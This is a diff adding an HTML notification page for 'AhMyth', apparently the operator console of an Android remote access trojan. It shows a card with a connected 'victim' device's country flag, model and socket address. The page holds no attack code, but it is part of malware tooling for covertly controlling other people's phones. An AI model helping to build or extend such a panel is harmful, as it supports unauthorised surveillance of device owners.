@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html ng-app="myappy" class="nopadding">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no" />
+
+    <title>AhMyth</title>
+
+    <!-- Insert this line above script imports  -->
+    <script>
+        if (typeof module === 'object') {
+            window.module = module;
+            module = undefined;
+        }
+    </script>
+
+
+    <script type="text/javascript" src="assets/js/lib/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
+    <script type="text/javascript" src="assets/js/controllers/NotifiCtrl.js"></script>
+    <!-- Insert this line after script imports -->
+    <script>
+        if (window.module) module = window.module;
+    </script>
+
+    <link rel="stylesheet" href="css/mystyle.css">
+    <link rel="stylesheet" href="../node_modules/semantic-ui/dist/semantic.min.css" />
+
+
+</head>
+
+<body ng-controller="NotifiCtrl" class="nopadding">
+
+
+    <div class="ui cards">
+        <div class="red card">
+            <div class="content">
+                <span class="right floated">
+                            <i  ng-if="victimCountry != null" class="{{victimCountry}} flag"></i>
+                            <i ng-if="victimCountry == null" class="help circle icon"></i>
+                        </span>
+                <div class="header" ng-bind="victimModel">
+
+                </div>
+                <div class="meta" ng-bind="victimSocket">
+
+                </div>
+
+            </div>
+        </div>
+
+
+
+
+</body>
+
+</html>
